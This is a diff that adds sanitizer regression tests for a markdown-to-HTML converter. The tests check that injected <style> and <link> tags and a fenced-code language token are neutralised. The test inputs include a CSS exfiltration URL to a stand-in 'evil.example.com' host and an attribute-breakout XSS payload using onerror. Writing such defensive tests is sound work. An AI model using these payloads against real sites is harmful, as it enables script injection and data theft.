@@ -542,6 +542,34 @@ describe('convertMarkdownToHtml', () => {
             assert.ok(!new RegExp(`<${tag}[\\s/>]`, 'i').test(html), `<${tag}> must be removed (got: ${html})`);
         }
     });
+
+    it('strips an author-supplied <style> block from source markdown (#523)', () => {
+        const html = convertMarkdownToHtml(
+            'Before\n\n<style>body{background:url(https://evil.example.com/exfil?x=1)}</style>\n\nAfter',
+        );
+        assert.ok(!/<style[\s>]/i.test(html), `<style> must be removed (got: ${html})`);
+        assert.ok(!html.includes('evil.example.com'), `the CSS payload must not survive (got: ${html})`);
+    });
+
+    it('removes a <link rel="stylesheet"> via the shared DANGEROUS_TAGS filter (#523)', () => {
+        const html = convertMarkdownToHtml('Before\n\n<link rel="stylesheet" href="https://evil.example.com/exfil.css">\n\nAfter');
+        assert.ok(!/<link[\s>]/i.test(html), `<link> must be removed (got: ${html})`);
+    });
+
+    it('allowlists the fenced-code language token before it reaches the class attribute (#498)', () => {
+        const html = convertMarkdownToHtml('```a"><img/src=x/onerror=alert(1)>\ncode here\n```');
+        // The downstream sanitizeRenderedHtml pass would strip a bare onerror=
+        // attribute regardless (defense-in-depth), so the meaningful assertion is
+        // that the class-attribute breakout never happens in the first place: no
+        // <img> element should exist in the output at all.
+        assert.ok(!/<img[\s>]/i.test(html), `the hostile info string must not break out of the class attribute and create a live <img> element (got: ${html})`);
+        assert.ok(html.includes('class="hljs"'), `expected the language class to be dropped entirely for a hostile token (got: ${html})`);
+    });
+
+    it('keeps a legitimate alphanumeric/hyphenated language token in the class attribute (#498)', () => {
+        const html = convertMarkdownToHtml('```c-sharp\nvar x = 1;\n```');
+        assert.ok(html.includes('language-c-sharp'), `expected the language class to survive for a safe token (got: ${html})`);
+    });
 });
 
 // ---------------------------------------------------------------------------
